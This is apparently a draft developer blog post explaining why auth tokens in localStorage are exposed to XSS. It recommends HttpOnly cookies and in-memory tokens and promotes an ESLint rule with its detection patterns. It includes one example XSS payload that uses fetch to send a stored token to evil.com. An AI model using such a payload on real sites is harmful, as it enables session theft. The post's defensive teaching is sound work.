---
title: 'Stop Storing Credentials in localStorage'
published: false
description: "localStorage is accessible to any JavaScript. That means XSS = credential theft. Here's the secure alternative."
tags: javascript, security, frontend, authentication
cover_image:
canonical_url:
---

```javascript
localStorage.setItem('authToken', token);
```

Every XSS vulnerability in your app now steals user sessions.

## The Problem

`localStorage` is accessible to **any JavaScript** running on your page. This includes:

- Your code
- Third-party scripts (analytics, ads, widgets)
- Malicious code injected via XSS

```javascript
// XSS payload
fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'));
```

## What Gets Stored Unsafely

```javascript
// ❌ All of these are vulnerable
localStorage.setItem('jwt', token);
localStorage.setItem('apiKey', key);
localStorage.setItem('refreshToken', refresh);
localStorage.setItem('session', sessionData);

sessionStorage.setItem('authToken', token); // Same problem
```

## The Attack Flow

1. Attacker finds XSS in your app (or a library you use)
2. Injects script that reads localStorage
3. Exfiltrates all tokens to attacker server
4. Attacker now has user access

## The Secure Pattern

```javascript
// ✅ Use HttpOnly cookies for auth tokens
// Server sets cookie, JavaScript can't access it
res.cookie('session', token, {
  httpOnly: true, // JavaScript can't read
  secure: true, // HTTPS only
  sameSite: 'strict',
});

// ✅ For client-side state, use non-sensitive data
localStorage.setItem('theme', 'dark'); // OK
localStorage.setItem('lastVisit', date); // OK
localStorage.setItem('preferences', prefs); // OK
```

## But I Need Client-Side Access

For SPAs that need to send tokens in headers:

```javascript
// ✅ Keep tokens in memory only
let accessToken = null;

async function login(credentials) {
  const response = await fetch('/auth/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
    credentials: 'include', // Refresh token in HttpOnly cookie
  });
  accessToken = (await response.json()).accessToken;
}

// Token in memory, refreshed via HttpOnly cookie
// XSS can't steal the refresh token
```

## Let ESLint Catch This

```bash
npm install --save-dev eslint-plugin-secure-coding
```

```javascript
import secureCoding from 'eslint-plugin-secure-coding';
export default [secureCoding.configs.recommended];
```

Credential storage is detected:

```bash
src/auth.ts
  12:3  error  🔒 CWE-522 OWASP:M1 CVSS:7.5 | Credentials stored in localStorage
               Fix: Use HttpOnly cookies or in-memory storage for auth tokens
```

## Detection Pattern

The rule catches:

- `localStorage.setItem('*token*', ...)`
- `localStorage.setItem('*key*', ...)`
- `localStorage.setItem('*secret*', ...)`
- `localStorage.setItem('*password*', ...)`
- `sessionStorage` with same patterns

## Storage Checklist

| Data Type        | Where to Store               |
| ---------------- | ---------------------------- |
| Access tokens    | Memory or HttpOnly cookie    |
| Refresh tokens   | HttpOnly cookie only         |
| API keys         | Never in browser (use proxy) |
| User preferences | localStorage ✅              |
| Shopping cart    | localStorage ✅              |

## Quick Install

```bash
npm install --save-dev eslint-plugin-secure-coding
```

```javascript
import secureCoding from 'eslint-plugin-secure-coding';
export default [secureCoding.configs.recommended];
```

Don't let XSS turn into full account takeover.

---

📦 [npm: eslint-plugin-secure-coding](https://www.npmjs.com/package/eslint-plugin-secure-coding)
📖 [Rule docs: no-credentials-in-storage-api](https://github.com/ofri-peretz/eslint/blob/main/packages/eslint-plugin-secure-coding/docs/rules/no-credentials-in-storage-api.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **Follow me for more security articles & updates:**
[GitHub](https://github.com/interlace-collie) | [X](https://x.com/ofriperetzdev) | [LinkedIn](https://linkedin.com/in/ofri-peretz) | [Dev.to](https://dev.to/ofriperetz)